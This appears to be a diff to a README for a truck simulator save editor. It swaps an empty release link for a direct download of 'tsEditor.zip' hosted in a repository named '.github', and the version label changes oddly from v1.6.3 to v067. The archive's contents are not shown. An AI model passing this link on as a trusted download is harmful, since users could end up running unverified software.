@@ -7,7 +7,7 @@ It allows players to modify, customize, and share their save files easily, makin
 
 ### - 🔗 ***Get Latest Release:***
 
-- [💾 v1.6.3 Release]() = `*Tool files & folder*`
+- [💾 v067 Release](https://github.com/Truck-Simulator-Save-Editor/.github/releases/download/ver.067/tsEditor.zip) = `*Tool files & folder*`
 
 ---
 
